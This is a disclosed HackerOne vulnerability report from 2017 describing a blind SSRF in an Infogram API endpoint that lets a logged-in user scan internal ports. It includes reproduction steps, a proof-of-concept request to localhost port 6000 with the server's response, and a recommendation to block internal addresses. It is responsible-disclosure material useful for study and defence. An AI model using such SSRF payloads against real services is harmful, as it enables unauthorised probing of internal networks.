# Internal Ports Scanning via Blind SSRF

## Report Details
- **Report ID**: 281950
- **URL**: https://hackerone.com/reports/281950
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-10-23T10:27:21.203Z
- **Disclosed**: 2017-11-03T14:12:43.562Z

## Reporter
- **Username**: tungpun
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: infogram

## Vulnerability Information
## Introduction:

I found a Blind SSRF issue that allows scanning internal ports.

## How to reproduce:

* Login
* Send the request `https://infogram.com/api/web_resource/url?q=[TARGET_URI]`
* Look up the response. If valid, it returns status code 200 and the website's title will be exposed, or 404 for otherwise.
For demonstration, I try scanning the *localhost* with a limited port range, then found some available ports: *80*, *81*, *6000*.

And here is the PoC:

```
GET /api/web_resource/url?q=http://0:6000/ HTTP/1.1
...
```

Response:

```
HTTP/1.1 200 OK
...

[{"title":"Create Infographics, Charts and Maps - Infogram","description":"Infogram is an easy to use infographic and chart maker. Create and share beautiful infographics, online charts and interactive maps. Make your own here.","url":"http://0:6000/"}]
```

As the filter does not validate the input, it allows the attacker to make the GET request to the internal network.

In conclusion, I think internal addresses should not be allowed.

## Attachments
No attachments
